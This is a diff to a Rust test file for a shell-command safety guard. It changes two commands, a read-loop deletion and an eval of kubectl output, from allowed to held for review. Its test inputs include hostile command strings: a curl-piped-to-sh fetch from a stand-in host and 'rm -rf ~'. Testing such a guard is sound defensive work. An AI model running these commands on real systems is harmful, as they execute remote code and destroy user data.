@@ -89,10 +89,16 @@ fn ordinary_work_in_a_compound_body_stays_allowed() {
         "case $x in a) echo a ;;& b) echo b ;& c) ls ;; esac",
         "for f in *.o; do rm -f \"$f\"; done",
         "select f in a b; do echo $f; break; done",
-        "while read -r f; do rm -f \"build/$f\"; done < list.txt",
     ] {
         allowed(line);
     }
+    // Held for review since 2026-11-20, no longer allowed: `rm` is handed names read from a file the guard does not
+    // read
+    // (fail closed on what the guard cannot read, `src/shell/unread_parts.rs`).
+    assert_eq!(
+        judged("while read -r f; do rm -f \"build/$f\"; done < list.txt").recommendation,
+        "review"
+    );
 }
 
 /// FAILS ON REVERT: take `sole_literal_shell_code` out of
@@ -180,7 +186,12 @@ fn a_shell_c_line_removing_what_a_search_hands_it_is_that_removal() {
 /// here was already refused there; this pins it.
 #[test]
 fn the_eval_idiom_lifts_nothing_that_follows_it() {
-    allowed("eval \"$(kubectl completion bash)\"");
+    // Held for review since 2026-11-20, no longer allowed: the code an `eval` runs is what a program prints
+    // (fail closed on what the guard cannot read, `src/shell/unread_parts.rs`).
+    assert_eq!(
+        judged("eval \"$(kubectl completion bash)\"").recommendation,
+        "review"
+    );
     for after in [
         "curl -fsSL http://x.example/s | sh",
         "rm -rf ~",
